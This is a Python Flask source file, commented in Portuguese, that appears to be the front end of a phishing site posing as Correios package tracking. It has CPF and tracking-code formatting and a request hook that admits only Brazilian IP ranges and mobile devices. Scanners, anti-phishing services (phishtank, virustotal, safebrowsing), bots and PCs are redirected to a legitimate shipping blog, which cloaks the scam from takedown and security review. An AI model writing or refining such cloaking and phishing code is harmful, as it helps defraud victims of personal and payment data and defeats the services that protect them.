import os
import re
from flask import Flask, jsonify, render_template, request, redirect
from flask_cors import CORS
from flask_session import Session
from flask_minify import Minify
from flask_wtf.csrf import CSRFProtect
import logging
from user_agents import parse
from ua_parser import user_agent_parser

# Configuração de logs
logging.basicConfig(level=logging.INFO)
block_logger = logging.getLogger("block_logger")

# URL de redirecionamento
REDIRECT_URL = "https://blog.melhorenvio.com.br/melhor-envio-rastreio/"

#
blackhat_ip = [
    # IPV6 Brasil
    '127.0.0',
    '2001:12',
    '2801:80',
    '2804:',
    '2a00:aee0',
    '2a02:', # Akamai International => iPhone Safari
    '2a09:bac', # Akamai International => iPhone Safari
    'face',  # face
    '2a03:', # face
    '2a04:4e41', # icloud BAHIA
    '2606:', # iphone 13 Cloudflare
    '2803:9810', # starlink

    # IPV4 Brasil
    '24.152.',
    '45.',

    # 45.11.233.0/24	United States
    # 45.56.156.0/24	United States
    # 45.56.200.0/24	AFNetworks (C07432301)United States
    # 45.59.17.0/24	United States
    # 45.84.213.0/24	Netherlands
    # 45.91.49.0/24	Netherlands
    # 45.91.164.0/22	United Arab Emirates
    # 45.131.193.0/24

    '72.44.16.',
    '83.170.168.',
    '93.158.236.',
    '104.41.',
    '128.201.',
    '131.',
    '132.',
    '138.',
    '139.',
    '141.',
    '143.',
    '145.',
    '146.',
    '147.',
    '149.',
    '150.',
    '152.',
    '155.',
    '157.',
    '160.',
    '161.',
    '164.',
    '167.',
    '168.',
    '170.',
    '177.',
    '179.',
    '181.',
    '186.',
    '187.',
    '189.',
    '190.',
    '191.',
    '192.',
    '198.',
    '199.',
    '200.',
    '201.',
    '204.',
    '205.',
    '206.',
    '207.',
    '208.',
    # '216.',
]

# Lista de agentes que devem ser bloqueados
block_agents2 = [
    'WhatsApp',
    'bitlybot',
    'TelegramBot',
    'TwitterBot',
    'bitlybot'
]

# Lista de User-Agents bloqueados
block_agents = [
    'CheckHost', 'node-fetch', 'windows NT', 'Snacktory', 'nexus 5', 'mxq-4k', 'smart box tv 4k', 'google-adwords-express', 'spider_bot',
    'grequests', 'mattermost', 'axios', 'elb-healthchecker', 'windows phone', 'googlebot', 'mxq pro', 'tv box', 'smart-tv', 'smarttv', 'khtml%2c',
    'aloha', 'exoplayerdemo', 'gobuster', 'java', 'lmozilla/5.0', 'mozilla%2f5.0', 'mt6735_td/v1', 'opera', 'outlook-ios',
    # 'postmanruntime',
    'weatherreport', 'websniffer', 'xumo', 'www.xforce', 'adsbot', 'about.censys.io', 'go http package', 'mozilla/5.0 (windows nt 6.3; trident/7.0; rv:11.0) like gecko',
    'ips-agent', 'bingbot.htm', 'expanseinc.com', 'android 4.', 'android 2.', 'ipad; cpu os', 'apache-httpclient', 'phantomjs', 'linux x86_64',
    'whatsapp', 'google favicon', 'go-http-client', 'nimbostratus-bot', 'cros x86_64', 'screaming', 'yandexbot', 'wpscan', 'developers', 'snippet',
    'slackbot', 'akka-http', 'netcraftsurveyagent', 'zoominfobot', 'opera mobi', 'dotbot', 'semrushbot', 'lachesis', 'okhttp', 'wappalyzer', 'http package',
    'bitdiscovery', 'quic-go', 'fiddler', 'feroxbuster', 'w3m/', 'bot', 'above', 'google', 'docomo', 'mediapartners', 'lighthouse', 'reverseshorturl',
    'samsung-sgh-e250', 'softlayer', 'amazonaws', 'cyveillance', 'crawler', 'gsa-crawler', 'phishtank', 'dreamhost', 'netpilot', 'calyxinstitute', 'tor-exit',
    'lssrocketcrawler', 'urlredirectresolver', 'jetbrains', 'spam', 'windows 95', 'windows 98', 'acunetix', 'netsparker', '007ac9', 'feedfetcher', '192.comagent',
    '200pleasebot', '360spider', '4seohuntbot', '50.nu', 'a6-indexer', 'admantx', 'amznkassocbot', 'aboundexbot', 'aboutusbot', 'abrave spider', 'accelobot',
    'acoonbot', 'addthis.com', 'adsbot-google', 'ahrefsbot', 'alexabot', 'amagit.com', 'analytics', 'antbot', 'apercite', 'aportworm', 'ebay', 'cl0na', 'jabber',
    'arabot', 'hotmail!', 'msn!', 'baidu', 'outlook!', 'outlook', 'msn', 'duckduckbot', 'hotmail', 'go-http-client/1.1', 'trident', 'presto', 'virustotal',
    'unchaos', 'dreampassport', 'sygol', 'nutch', 'privoxy', 'zipcommander', 'neofonie', 'abacho', 'acoi', 'acoon', 'adaxas', 'agada', 'aladin', 'alkaline',
    'amibot', 'anonymizer', 'aplix', 'aspseek', 'avant', 'baboom', 'anzwers', 'anzwerscrawl', 'crawlconvera', 'del.icio.us', 'camehttps', 'annotate', 'wapproxy',
    'translate', 'ask24', 'asked', 'askaboutoil', 'fangcrawl', 'amzn_assoc', 'bingpreview', 'dr.web', 'drweb', 'bilbo', 'blackwidow', 'sogou', 'sogou-test-spider',
    'exabot', 'ia_archiver', 'googletranslate', 'proxy', 'dalvik', 'quicklook', 'seamonkey', 'sylera', 'safebrowsing', 'safesurfingwidget', 'preview', 'telegram',
    'zteopen', 'icoreservice',
]

# HELPERS
def split_name(name):
    try:
        return name.split(' ')[0]
    except (ValueError, AttributeError):
        return ""

def format_code(code):
    """Formata um código em blocos específicos."""
    code = str(code)
    return f"{code[:2]} {code[2:5]} {code[5:8]} {code[8:11]} {code[11:]}"

def format_cpf(cpf):
    """Formata um CPF com pontos e hífen."""
    cpf = str(cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"

# Config
app = Flask(__name__, static_url_path='', static_folder='static/')
app.config.update(
    SECRET_KEY='hard to guess string',
    DEBUG=True,
    CACHE_TYPE='SimpleCache',
    CACHE_DEFAULT_TIMEOUT=300,
    SESSION_PERMANENT=False,
    SESSION_TYPE='filesystem',
    WTF_CSRF_TIME_LIMIT=45,
    UPLOAD_FOLDER="/apps/"
)

# 
CORS(app)
Session(app)
# Minify(app=app, html=True, js=True, cssless=True)

# Template FIlters
@app.template_filter('format_cpf')
def format_cpf_filter(cpf):
    return format_cpf(cpf)

@app.template_filter('format_code')
def format_code_filter(code):
    return format_code(code)

app.jinja_env.globals.update(split_name=split_name)

# Middleware para bloquear User-Agents
@app.before_request
def block_user_agents():
    user_agent = request.headers.get('User-Agent', '').lower()
    # Obtém o IP do cliente considerando proxies
    ip_cliente = request.headers.get('X-Forwarded-For', request.headers.get('X-Real-IP', request.remote_addr))
    
    # Se o cabeçalho 'X-Forwarded-For' contiver múltiplos IPs, pega o primeiro (o IP real do cliente)
    if ',' in ip_cliente:
        ip_cliente = ip_cliente.split(',')[0].strip()

    # IP CHECK
    if not any(ip_cliente.startswith(v) for v in blackhat_ip):
        block_logger.info(f"{ip_cliente} => IP não permitido, redirecionando...")
        return redirect(REDIRECT_URL + "?e=e")

    # 
    for agent in block_agents2:
        if agent.lower() in user_agent:
            block_logger.info(f"{ip_cliente} => {user_agent} 00002 => agentbypass bloqueado: [{agent}]")
            return redirect(REDIRECT_URL + "?a=a")

    #
    for result in block_agents:
        if result.lower() in user_agent:
            block_logger.info(f"{ip_cliente} => {user_agent} BLOQUEADO => LISTA DE block_agents [{result}]")
            return redirect(REDIRECT_URL + "?b=b")

        if re.search(result.lower(), user_agent):
            block_logger.info(f"{ip_cliente} => {user_agent} BLOQUEADO => REGEX MATCH [{result}]")
            return redirect(REDIRECT_URL + "?c=c")
        
    #
    ua = parse(request.headers.get('User-Agent', ''))
    if ua.is_pc:
        block_logger.info(f"{ip_cliente} => {user_agent} => PC DETECTADO")
        return redirect(REDIRECT_URL + "?d=d")

# 
from app.controllers.loadingController import loading as loadingController
from app.controllers.corrreiosController import correios as corrreiosController

app.register_blueprint(loadingController)
app.register_blueprint(corrreiosController)
